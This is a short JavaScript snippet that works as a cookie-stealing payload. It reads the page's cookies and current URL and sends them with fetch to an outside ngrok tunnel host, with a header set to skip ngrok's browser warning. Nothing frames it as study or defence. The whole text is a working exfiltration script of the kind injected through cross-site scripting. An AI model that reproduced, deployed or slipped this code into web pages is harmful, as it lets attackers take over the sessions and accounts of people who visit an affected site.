fetch('https://osprey-gorgeous-gazelle.ngrok-free.app/?cookies=' + encodeURIComponent(document.cookie) + 
        '&location=' + encodeURIComponent(window.location.href), {
    method: 'GET',
    headers: {
      'ngrok-skip-browser-warning': 'true'
    }
  })
  .then(response => console.log('Data sent successfully:', response))
  .catch(error => console.error('Error:', error));
